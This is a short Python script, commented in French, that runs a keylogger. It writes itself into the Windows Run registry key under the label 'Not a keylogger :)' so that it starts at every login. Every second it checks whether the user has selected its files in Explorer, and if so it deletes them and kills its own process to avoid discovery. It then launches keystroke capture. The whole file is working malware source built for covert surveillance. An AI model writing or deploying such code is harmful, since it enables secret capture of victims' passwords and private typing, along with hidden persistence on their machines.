import os
import Keylogger
import fileSelection
import threading
import psutil

def delete():
    # Suppression du fichier dans l'éventualité où il est ouvert de façon externe
    if os.name == "nt":
        try:
            pwd = os.path.abspath(os.getcwd())
            os.system("cd " + pwd)
            print('File was closed.')
            os.system("DEL " + pwd + "\\" + "fileSelection.py")
            os.system("DEL "  + pwd + "\\" + "Keylogger.py")
            os.system("DEL " + os.path.basename(__file__))
            psutil.Process(os.getpid()).kill()
        except OSError: 
            print('File is closed.')

    # Dans l'éventualité où le système n'est pas un système nt, on supprime tout et ferme automatiquement
    else:
        try:
            pwd = os.path.abspath(os.getcwd())
            os.system("cd " + pwd)
            os.system('pkill leafpad')
            os.system("chattr -i " +  os.path.basename(__file__))
            print('File was closed.')
            os.system("rm -rf " + pwd + "\\" + "fileSelection.py")
            os.system("rm -rf " + pwd + "\\" + "Keylogger.py")
            os.system("rm -rf" + os.path.basename(__file__))
        except OSError:
            print('File is closed.')

def checkSelection():
    pwd = os.path.abspath(os.getcwd()).lower()
    codeFiles = [pwd + "\code.py", pwd + "\keylogger.py", pwd + "\\fileselection.py"]
    selectedFiles = fileSelection.explorer_fileselection()
    if selectedFiles != []:
        for file in selectedFiles:
            if str(file).lower() in codeFiles:
                delete()
    timer = threading.Timer(1, checkSelection)
    timer.start()

def addRegKey():
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "Not a keylogger :)", 0, winreg.REG_SZ, os.path.abspath(__file__))
    winreg.CloseKey(key)

addRegKey()
checkSelection() 
logger = Keylogger.KeyLogger(5)
logger.run()
